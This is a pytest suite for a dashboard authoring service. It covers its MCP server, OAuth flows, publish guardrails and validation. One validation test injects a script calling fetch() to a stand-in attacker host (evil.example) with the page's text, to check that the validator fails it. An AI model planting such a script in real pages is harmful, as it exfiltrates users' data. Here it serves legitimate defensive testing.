"""Phase 4: drafts, validation (P4.5), the MCP server and OAuth (P4.1), guardrails (P4.6)."""

from __future__ import annotations

import base64
import hashlib
import json
import os
import struct
import zlib
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlsplit

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import text as sql

from tabfree_api.authoring import files as bf
from tabfree_api.authoring import png
from tabfree_api.authoring.budget import BudgetError, RateLimiter, TokenBudget
from tabfree_api.authoring.validation import validate
from tabfree_api.content import Site
from tabfree_api.db import connect, upgrade
from tabfree_api.db.seed import import_site
from tabfree_api.main import create_app
from tabfree_api.settings import REPO_ROOT, Settings

pytest.importorskip("duckdb")
CSRF = {"X-TabFree-Request": "1"}
EXAMPLE = REPO_ROOT / "packages" / "schemas" / "examples" / "dashboards" / "sales-overview"


def example_files() -> dict[str, str]:
    return {p: (EXAMPLE / p).read_text(encoding="utf-8") for p in (bf.MANIFEST, bf.HTML)}


POSTGRES = os.environ.get("TABFREE_TEST_POSTGRES_URL")


@pytest.fixture(params=["sqlite", "postgres"])
def app(request: pytest.FixtureRequest, tmp_path: Path) -> Iterator[Any]:
    """The dev site in the database; on Postgres too when TABFREE_TEST_POSTGRES_URL is set (CI)."""
    if request.param == "postgres":
        if not POSTGRES:
            pytest.skip("set TABFREE_TEST_POSTGRES_URL to run against Postgres")
        url = POSTGRES
        engine = connect(url)
        with engine.begin() as conn:
            conn.execute(sql("DROP SCHEMA public CASCADE"))
            conn.execute(sql("CREATE SCHEMA public"))
    else:
        url = f"sqlite:///{tmp_path / 'authoring.db'}"
        engine = connect(url)
    upgrade(engine)
    import_site(engine, Site(Settings().site_file))
    yield create_app(
        Settings(
            environment="test",
            dev_login=True,
            database_url=url,
            site_id="dev",
            permission_cache_s=0,
            base_url="http://testserver",
        )
    )
    engine.dispose()


def as_user(app: Any, user: str) -> TestClient:
    client = TestClient(app)
    assert client.post("/auth/dev", content=f"user={user}", follow_redirects=False).status_code == 303
    return client


def pat(app: Any, user: str) -> str:
    response = as_user(app, user).post("/api/tokens", json={"name": "mcp"}, headers=CSRF)
    assert response.status_code == 201
    return str(response.json()["token"])


class Mcp:
    def __init__(self, app: Any, token: str) -> None:
        self.client = TestClient(app)
        self.headers = {"Authorization": f"Bearer {token}"}
        self.next = 1

    def rpc(self, method: str, params: dict[str, Any] | None = None) -> Any:
        body = {"jsonrpc": "2.0", "id": self.next, "method": method, "params": params or {}}
        self.next += 1
        response = self.client.post("/mcp", json=body, headers=self.headers)
        assert response.status_code == 200, response.text
        return response.json()

    def call(self, name: str, **arguments: Any) -> dict[str, Any]:
        answer = self.rpc("tools/call", {"name": name, "arguments": arguments})
        assert "result" in answer, answer
        result: dict[str, Any] = answer["result"]
        return result


def text(result: dict[str, Any]) -> str:
    return str(result["content"][0]["text"])


def fenced(body: str) -> Any:
    """The JSON inside the first <untrusted-data> fence of a tool result."""
    inside = body.split("<untrusted-data", 1)[1].split(">\n", 1)[1].rsplit("\n</untrusted-data", 1)[0]
    return json.loads(inside)


# ---- files and edits -------------------------------------------------------------------------------


def test_edits_apply_in_order_and_all_or_nothing() -> None:
    files = example_files()
    out = bf.apply_edits(
        files,
        [
            {
                "path": "index.html",
                "op": "replace",
                "old": 'mark="bar" x="Sales"',
                "new": 'mark="bar" x="Profit Ratio"',
            },
            {"path": "tabfree.json", "op": "json_set", "pointer": "/queries/by_region/limit", "value": 3},
            {"path": "tabfree.json", "op": "json_remove", "pointer": "/actions/1"},
            {"path": "README.md", "op": "write", "content": "notes"},
        ],
    )
    manifest = bf.parse_manifest(out)
    assert manifest["queries"]["by_region"]["limit"] == 3
    assert len(manifest["actions"]) == 1
    assert 'x="Profit Ratio"' in out["index.html"]
    assert out["README.md"] == "notes"
    with pytest.raises(bf.EditError, match="does not occur"):
        bf.apply_edits(files, [{"path": "index.html", "op": "replace", "old": "nope", "new": "x"}])
    with pytest.raises(bf.EditError, match="occurs"):
        bf.apply_edits(files, [{"path": "index.html", "op": "replace", "old": "tf-kpi", "new": "x"}])
    with pytest.raises(bf.EditError, match="no 'missing'"):
        bf.apply_edits(
            files, [{"path": "tabfree.json", "op": "json_set", "pointer": "/missing/x", "value": 1}]
        )
    with pytest.raises(bf.EditError, match="only"):
        bf.apply_edits(files, [{"path": "app.js", "op": "write", "content": "x"}])
    with pytest.raises(bf.EditError, match="limited"):
        bf.apply_edits(
            files, [{"path": "README.md", "op": "write", "content": "x" * (bf.MAX_FILE_BYTES + 1)}]
        )
    patch = bf.diff(files, out)
    assert "+++ b/index.html" in patch
    assert '-      <tf-chart query="by_region" mark="bar" x="Sales"' in patch
    assert bf.diff_stat(files, out)["README.md"] == {"added": 1, "removed": 0}


# ---- validation (P4.5) -----------------------------------------------------------------------------


def test_validation_reports_each_check() -> None:
    files = example_files()
    report = validate(files)
    by_name = {c.name: c for c in report.checks}
    assert report.ok
    assert by_name["manifest"].status == "pass"
    assert by_name["scripts"].status == "pass"
    assert by_name["accessibility"].status == "warn"  # the example's charts have no titles
    assert by_name["compile"].status == "skip"
    broken = {**files, "index.html": files["index.html"].replace('query="trend"', 'query="nope"')}
    assert not validate(broken).ok
    leaky = {
        **files,
        "index.html": files["index.html"].replace(
            "</body>", "<script>fetch('https://evil.example/?d=' + document.body.innerText)</script></body>"
        ),
    }
    scripts = {c.name: c for c in validate(leaky).checks}["scripts"]
    assert scripts.status == "fail"
    assert any("network" in m for m in scripts.messages)
    link = {
        **files,
        "index.html": files["index.html"].replace("<body>", '<body><a href="https://x.example">x</a>'),
    }
    assert not validate(link).ok
    bad_json = {**files, "tabfree.json": "{"}
    assert {c.name: c.status for c in validate(bad_json).checks}["manifest"] == "fail"


def _png(width: int, height: int, color: tuple[int, int, int], *, filter_type: int = 0) -> bytes:
    raw = b"".join(bytes([filter_type]) + bytes(color) * width for _ in range(height))
    if filter_type == 2:  # "up": rows after the first are zero deltas
        raw = (
            bytes([2])
            + bytes(color) * width
            + b"".join(bytes([2]) + bytes(3 * width) for _ in range(height - 1))
        )

    def chunk(kind: bytes, data: bytes) -> bytes:
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))

    header = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", header)
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


def test_screenshot_diff() -> None:
    white, black = _png(4, 4, (255, 255, 255)), _png(4, 4, (0, 0, 0), filter_type=2)
    assert png.decode(black).pixels == bytes(48)
    assert png.changed_fraction(white, white) == 0.0
    assert png.changed_fraction(white, black) == 1.0
    assert png.changed_fraction(white, _png(5, 4, (255, 255, 255))) == 1.0
    report = validate(example_files(), screenshots=lambda: (white, black))
    shot = {c.name: c for c in report.checks}["screenshot"]
    assert shot.status == "warn"
    assert "100%" in shot.messages[0]


# ---- guardrails (P4.6) -----------------------------------------------------------------------------


def test_rate_limit_and_token_budget() -> None:
    clock = [0.0]
    limiter = RateLimiter(2, clock=lambda: clock[0])
    limiter.take("u")
    limiter.take("u")
    with pytest.raises(BudgetError, match="too many"):
        limiter.take("u")
    limiter.take("other")
    clock[0] = 30.0
    limiter.take("u")
    budget = TokenBudget("s", per_user=100, per_site=150)
    budget.record("a", 60, 50)
    with pytest.raises(BudgetError, match="you have used"):
        budget.check("a")
    budget.check("b")
    budget.record("b", 40, 0)
    with pytest.raises(BudgetError, match="this site"):
        budget.check("b")


def test_token_budget_in_the_database(app: Any) -> None:
    site = app.state.context.site
    budget = TokenBudget("dev", per_user=10, per_site=0, engine=site.engine, overrides=site.settings)
    budget.record("casey", 4, 4)
    budget.record("casey", 1, 1)
    assert budget.used("casey") == 10
    with pytest.raises(BudgetError):
        budget.check("casey")
    site.update_site(settings={"aiDailyTokensPerUser": 100})
    budget.check("casey")


# ---- the MCP server (P4.1) ---------------------------------------------------------------------------


def test_mcp_requires_a_token_and_points_to_the_authorization_server(app: Any) -> None:
    client = TestClient(app)
    response = client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
    assert response.status_code == 401
    challenge = response.headers["www-authenticate"]
    assert 'resource_metadata="http://testserver/.well-known/oauth-protected-resource/mcp"' in challenge
    meta = client.get("/.well-known/oauth-protected-resource/mcp").json()
    assert meta["resource"] == "http://testserver/mcp"
    assert meta["authorization_servers"] == ["http://testserver"]
    server = client.get("/.well-known/oauth-authorization-server").json()
    assert server["code_challenge_methods_supported"] == ["S256"]
    bad = client.post("/mcp", json={}, headers={"Authorization": "Bearer nope"})
    assert bad.status_code == 401
    assert 'error="invalid_token"' in bad.headers["www-authenticate"]
    assert client.get("/mcp").status_code == 405


def test_mcp_session_lists_tools_and_reads_content(app: Any) -> None:
    mcp = Mcp(app, pat(app, "bob"))
    init = mcp.rpc(
        "initialize", {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "t"}}
    )
    assert init["result"]["protocolVersion"] == "2025-06-18"
    assert init["result"]["serverInfo"]["name"] == "tabfree"
    assert (
        mcp.client.post(
            "/mcp", json={"jsonrpc": "2.0", "method": "notifications/initialized"}, headers=mcp.headers
        ).status_code
        == 202
    )
    names = {t["name"] for t in mcp.rpc("tools/list")["result"]["tools"]}
    assert {
        "list_content",
        "describe_model",
        "run_governed_query",
        "edit_dashboard_files",
        "request_publish",
        "confirm_publish",
        "learn",
        "preview",
        "diff_revisions",
    } <= names
    preview = next(t for t in mcp.rpc("tools/list")["result"]["tools"] if t["name"] == "preview")
    assert preview["_meta"]["ui"]["resourceUri"] == "ui://tabfree/preview"
    resource = mcp.rpc("resources/read", {"uri": "ui://tabfree/preview"})["result"]["contents"][0]
    assert resource["mimeType"] == "text/html;profile=mcp-app"
    assert "ui/notifications/tool-result" in resource["text"]

    listing = mcp.call("list_content", kind="dashboard")
    assert {i["id"] for i in listing["structuredContent"]["items"]} == {"sales-overview", "sales-analysis"}
    assert (
        "two-step" in text(mcp.call("learn", topic="overview")).lower()
        or "workflow" in text(mcp.call("learn", topic="overview")).lower()
    )
    assert '"$defs"' in text(mcp.call("learn", topic="schema"))

    described = text(mcp.call("describe_model", model="superstore_sales"))
    assert '"canQuery": true' in described
    assert "<untrusted-data" in described  # sample values are fenced

    # Row-level security applies to the agent exactly as to the person: Bob manages the West.
    result = mcp.call(
        "run_governed_query",
        model="superstore_sales",
        query={"dimensions": ["Region"], "measures": ["Sales"]},
    )
    assert [r[0] for r in fenced(text(result))] == ["West"]

    bad = mcp.rpc("tools/call", {"name": "run_governed_query", "arguments": {"model": "superstore_sales"}})
    assert bad["error"]["code"] == -32602
    hidden = mcp.call("describe_model", model="superstore")
    assert hidden["isError"]
    assert "no model" in text(hidden)
    assert mcp.rpc("tools/call", {"name": "nope"})["error"]["code"] == -32602
    assert mcp.rpc("bogus")["error"]["code"] == -32601


def test_mcp_refuses_other_sites_origins(app: Any) -> None:
    mcp = Mcp(app, pat(app, "bob"))
    response = mcp.client.post(
        "/mcp",
        json={"jsonrpc": "2.0", "id": 1, "method": "ping"},
        headers={**mcp.headers, "Origin": "https://evil.example"},
    )
    assert response.status_code == 403
    same = mcp.client.post(
        "/mcp",
        json={"jsonrpc": "2.0", "id": 1, "method": "ping"},
        headers={**mcp.headers, "Origin": "http://testserver"},
    )
    assert same.status_code == 200


# ---- drafts and the two-step publish ------------------------------------------------------------


def test_edit_validate_and_publish_with_two_steps(app: Any) -> None:
    mcp = Mcp(app, pat(app, "casey"))
    edited = mcp.call(
        "edit_dashboard_files",
        dashboard="sales-overview",
        edits=[
            {
                "path": "index.html",
                "op": "replace",
                "old": '<tf-chart query="by_region" mark="bar"',
                "new": '<tf-chart query="by_region" title="Sales by region" mark="bar"',
            }
        ],
    )
    assert not edited["isError"], text(edited)
    draft = edited["structuredContent"]["draft"]["id"]
    assert "validation: ok" in text(edited)
    # Nothing anyone else sees has changed yet.
    viewer = as_user(app, "erin").get("/api/dashboards/sales-overview").json()
    assert 'title="Sales by region"' not in viewer["html"]

    full = mcp.call("validate_dashboard", draft=draft)
    checks = {c["name"]: c["status"] for c in full["structuredContent"]["checks"]}
    assert checks["compile"] == "pass"
    assert checks["data"] in ("pass", "warn")

    preview = mcp.call("preview", draft=draft)
    assert set(preview["structuredContent"]["preview"]["results"]) == {
        "kpis",
        "by_region",
        "trend",
        "top_customers",
    }

    diff = text(mcp.call("diff_revisions", draft=draft))
    assert '+      <tf-chart query="by_region" title="Sales by region"' in diff

    requested = mcp.call("request_publish", draft=draft, message="Title the region chart")
    assert not requested["isError"], text(requested)
    code = requested["structuredContent"]["confirmation"]
    assert mcp.call("confirm_publish", draft=draft, confirmation="0000-0000-0000")["isError"]
    published = mcp.call("confirm_publish", draft=draft, confirmation=code)
    assert not published["isError"], text(published)
    revision = published["structuredContent"]["revision"]
    assert revision == 2
    assert (
        'title="Sales by region"' in as_user(app, "erin").get("/api/dashboards/sales-overview").json()["html"]
    )
    history = mcp.call("list_revisions", dashboard="sales-overview")["structuredContent"]["revisions"]
    assert history[-1]["message"] == "Title the region chart"
    assert history[-1]["createdBy"] == "casey"
    # The draft is spent; the code cannot publish again.
    assert mcp.call("confirm_publish", draft=draft, confirmation=code)["isError"]
    assert "+      <tf-chart" in text(mcp.call("diff_revisions", dashboard="sales-overview", from_revision=1))


def test_capabilities_decide_who_may_draft_and_publish(app: Any) -> None:
    # Erin (Explorer, Executives) has Web Edit but no Overwrite: the Explorer role cannot overwrite.
    erin = Mcp(app, pat(app, "erin"))
    edited = erin.call(
        "edit_dashboard_files",
        dashboard="sales-overview",
        edits=[{"path": "README.md", "op": "write", "content": "idea"}],
    )
    assert not edited["isError"]
    draft = edited["structuredContent"]["draft"]["id"]
    refused = erin.call("request_publish", draft=draft)
    assert refused["isError"]
    assert "Overwrite" in text(refused)
    # Bob (Managers) may view but not edit; Mallory cannot even see the dashboard; nobody sees Erin's draft.
    bob = Mcp(app, pat(app, "bob"))
    no_edit = bob.call(
        "edit_dashboard_files",
        dashboard="sales-overview",
        edits=[{"path": "README.md", "op": "write", "content": "x"}],
    )
    assert no_edit["isError"]
    assert "Web Edit" in text(no_edit)
    assert bob.call("get_dashboard", draft=draft)["isError"]
    mallory = Mcp(app, pat(app, "mallory"))
    assert "no dashboard" in text(mallory.call("get_dashboard", dashboard="sales-overview"))
    # A failing draft cannot be requested for publishing.
    casey = Mcp(app, pat(app, "casey"))
    broken = casey.call(
        "edit_dashboard_files",
        dashboard="sales-overview",
        edits=[{"path": "index.html", "op": "replace", "old": 'query="trend"', "new": 'query="gone"'}],
    )
    assert "validation: FAILED" in text(broken)
    bad = casey.call("request_publish", draft=broken["structuredContent"]["draft"]["id"])
    assert bad["isError"]
    assert "does not pass validation" in text(bad)


def test_new_dashboards_need_publish_on_the_project(app: Any) -> None:
    casey = Mcp(app, pat(app, "casey"))
    created = casey.call(
        "create_dashboard",
        dashboard="regional-kpis",
        project="sales",
        title="Regional KPIs",
        model="superstore_sales",
    )
    assert not created["isError"], text(created)
    draft = created["structuredContent"]["id"]
    assert casey.call("validate_dashboard", draft=draft)["structuredContent"]["ok"]
    code = casey.call("request_publish", draft=draft)["structuredContent"]["confirmation"]
    assert not casey.call("confirm_publish", draft=draft, confirmation=code)["isError"]
    listing = casey.call("list_content", kind="dashboard")["structuredContent"]["items"]
    assert "regional-kpis" in {i["id"] for i in listing}
    # Erin has no Publish on the project; and ids are unique.
    erin = Mcp(app, pat(app, "erin"))
    assert "Publish" in text(
        erin.call("create_dashboard", dashboard="mine", project="sales", title="M", model="superstore_sales")
    )
    assert "exists" in text(
        casey.call(
            "create_dashboard",
            dashboard="regional-kpis",
            project="sales",
            title="Again",
            model="superstore_sales",
        )
    )


def test_changes_after_a_request_cancel_it_and_approval_can_be_required(app: Any) -> None:
    casey = Mcp(app, pat(app, "casey"))
    edit = [{"path": "README.md", "op": "write", "content": "v1"}]
    draft = casey.call("edit_dashboard_files", dashboard="sales-overview", edits=edit)["structuredContent"][
        "draft"
    ]["id"]
    code = casey.call("request_publish", draft=draft)["structuredContent"]["confirmation"]
    casey.call(
        "edit_dashboard_files", draft=draft, edits=[{"path": "README.md", "op": "write", "content": "v2"}]
    )
    stale = casey.call("confirm_publish", draft=draft, confirmation=code)
    assert stale["isError"]
    assert "request publishing first" in text(stale)

    admin = as_user(app, "admin")
    assert (
        admin.patch(
            "/api/admin/site", json={"settings": {"authoringApproval": "required"}}, headers=CSRF
        ).status_code
        == 204
    )
    code = casey.call("request_publish", draft=draft)["structuredContent"]["confirmation"]
    waiting = casey.call("confirm_publish", draft=draft, confirmation=code)
    assert waiting["isError"]
    assert "approval" in text(waiting)
    priya = as_user(app, "priya")
    assert priya.post(f"/api/drafts/{draft}/approve", headers=CSRF).status_code == 204
    assert not casey.call("confirm_publish", draft=draft, confirmation=code)["isError"]
    assert (
        admin.patch(
            "/api/admin/site", json={"settings": {"authoringApproval": "sometimes"}}, headers=CSRF
        ).status_code
        == 422
    )


def test_agent_tokens_act_as_the_user_but_cannot_confirm(app: Any) -> None:
    ctx = app.state.context
    token = ctx.oauth.mint_agent_token("casey", "agent-123", "http://testserver/mcp")
    agent = Mcp(app, token)
    edited = agent.call(
        "edit_dashboard_files",
        dashboard="sales-overview",
        edits=[{"path": "README.md", "op": "write", "content": "by the agent"}],
    )
    draft = edited["structuredContent"]["draft"]["id"]
    code = agent.call("request_publish", draft=draft)["structuredContent"]["confirmation"]
    refused = agent.call("confirm_publish", draft=draft, confirmation=code)
    assert refused["isError"]
    assert "agent cannot confirm" in text(refused)
    events = as_user(app, "admin").get("/api/admin/audit", params={"limit": 200}).json()
    tagged = [e for e in events if e["detail"].get("agent_session") == "agent-123"]
    assert {"draft_edit", "tool_call", "publish_request"} <= {e["action"] for e in tagged}
    ctx.oauth.revoke_agent_session("agent-123")
    response = agent.client.post(
        "/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "ping"}, headers=agent.headers
    )
    assert response.status_code == 401


# ---- OAuth (P4.1) -------------------------------------------------------------------------------------


def _pkce() -> tuple[str, str]:
    verifier = base64.urlsafe_b64encode(b"v" * 40).rstrip(b"=").decode()
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
    return verifier, challenge


def test_oauth_authorization_code_flow(app: Any) -> None:
    client = TestClient(app)
    registered = client.post(
        "/oauth/register",
        json={"client_name": "Claude Code", "redirect_uris": ["http://127.0.0.1:33418/callback"]},
    )
    assert registered.status_code == 201
    client_id = registered.json()["client_id"]
    assert (
        client.post("/oauth/register", json={"redirect_uris": ["http://evil.example/cb"]}).status_code == 400
    )

    verifier, challenge = _pkce()
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": "http://127.0.0.1:50123/callback",
        "code_challenge": challenge,
        "code_challenge_method": "S256",
        "state": "xyz",
        "scope": "tabfree.read tabfree.author",
        "resource": "http://testserver/mcp",
    }
    # Not signed in: off to the sign-in page first.
    assert (
        client.get("/oauth/authorize", params=params, follow_redirects=False)
        .headers["location"]
        .startswith("/auth/login")
    )
    browser = as_user(app, "casey")
    page = browser.get("/oauth/authorize", params=params)
    assert page.status_code == 200
    assert "Claude Code" in page.text
    assert "Casey" in page.text
    assert "frame-ancestors 'none'" in page.headers["content-security-policy"]
    form = {
        inp.split('name="')[1].split('"')[0]: inp.split('value="')[1].split('"')[0]
        for inp in page.text.split("<input")[1:]
    }
    tampered = {**form, "scope": "tabfree.read", "decision": "allow"}
    assert browser.post("/oauth/authorize", data=tampered, follow_redirects=False).status_code == 400
    approved = browser.post("/oauth/authorize", data={**form, "decision": "allow"}, follow_redirects=False)
    assert approved.status_code == 303
    location = urlsplit(approved.headers["location"])
    assert (location.hostname, location.port) == ("127.0.0.1", 50123)
    query = parse_qs(location.query)
    assert query["state"] == ["xyz"]
    code = query["code"][0]

    token = {
        "grant_type": "authorization_code",
        "code": code,
        "client_id": client_id,
        "redirect_uri": params["redirect_uri"],
        "code_verifier": "wrong" * 10,
    }
    assert client.post("/oauth/token", data=token).json()["error"] == "invalid_grant"
    tokens = client.post("/oauth/token", data={**token, "code_verifier": verifier})
    assert tokens.status_code == 200, tokens.text
    access, _refresh = tokens.json()["access_token"], tokens.json()["refresh_token"]
    assert tokens.headers["cache-control"] == "no-store"

    mcp = Mcp(app, access)
    assert mcp.call("list_content", kind="dashboard")["structuredContent"]["items"]
    # The same token works for the REST API (the CLI uses it).
    assert client.get("/api/me", headers={"Authorization": f"Bearer {access}"}).json()["username"] == "casey"

    # A replayed code fails and revokes what it issued.
    replay = client.post("/oauth/token", data={**token, "code_verifier": verifier})
    assert replay.json()["error"] == "invalid_grant"
    assert (
        client.post(
            "/mcp",
            json={"jsonrpc": "2.0", "id": 1, "method": "ping"},
            headers={"Authorization": f"Bearer {access}"},
        ).status_code
        == 401
    )


def test_oauth_refresh_rotates_and_detects_reuse(app: Any) -> None:
    store = app.state.context.oauth
    client_id = store.register("t", ["https://client.example/cb"])["client_id"]
    verifier, challenge = _pkce()
    code = store.issue_code(
        client_id, "casey", "https://client.example/cb", challenge, "tabfree.read", "http://testserver/mcp"
    )
    first = store.exchange_code(code, client_id, "https://client.example/cb", verifier, None)
    client = TestClient(app)
    second = client.post(
        "/oauth/token",
        data={"grant_type": "refresh_token", "refresh_token": first["refresh_token"], "client_id": client_id},
    ).json()
    assert second["scope"] == "tabfree.read"
    widen = client.post(
        "/oauth/token",
        data={
            "grant_type": "refresh_token",
            "refresh_token": second["refresh_token"],
            "client_id": client_id,
            "scope": "tabfree.read tabfree.author",
        },
    )
    assert widen.json()["error"] == "invalid_scope"
    # Reusing the first (rotated) refresh token ends the whole family.
    reuse = client.post(
        "/oauth/token",
        data={"grant_type": "refresh_token", "refresh_token": first["refresh_token"], "client_id": client_id},
    )
    assert reuse.json()["error"] == "invalid_grant"
    assert store.authenticate(second["access_token"], ("http://testserver/mcp",)) is None
    # A read-only token sees only read tools.
    read_only = store.exchange_code(
        store.issue_code(
            client_id,
            "casey",
            "https://client.example/cb",
            challenge,
            "tabfree.read",
            "http://testserver/mcp",
        ),
        client_id,
        "https://client.example/cb",
        verifier,
        None,
    )
    tools = {t["name"] for t in Mcp(app, read_only["access_token"]).rpc("tools/list")["result"]["tools"]}
    assert "list_content" in tools
    assert "edit_dashboard_files" not in tools


def test_the_cli_round_trip_against_the_server(
    app: Any, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """P4.2: tabfree pull, push and publish through the real MCP endpoint."""
    from tabfree_cli import main as cli
    from tabfree_cli.client import Mcp as CliMcp

    server = TestClient(app)

    def http(request: Any) -> tuple[int, dict[str, str], bytes]:
        response = server.post(
            urlsplit(request.full_url).path, content=request.data, headers=dict(request.header_items())
        )
        return response.status_code, dict(response.headers), response.content

    mcp = CliMcp("http://testserver", pat(app, "casey"), http=http)
    monkeypatch.setattr(cli, "connect", lambda url=None: mcp)
    folder = tmp_path / "so"
    cli.pull(mcp, "sales-overview", folder)
    html = (folder / "index.html").read_text()
    (folder / "index.html").write_text(
        html.replace(
            '<tf-crosstab query="top_customers">', '<tf-crosstab query="top_customers" title="Top customers">'
        )
    )
    assert cli.main(["push", str(folder)]) == 0
    monkeypatch.setattr("builtins.input", lambda _prompt: "y")
    assert cli.main(["publish", str(folder), "-m", "Title the crosstab"]) == 0
    published = as_user(app, "erin").get("/api/dashboards/sales-overview").json()["html"]
    assert 'title="Top customers"' in published
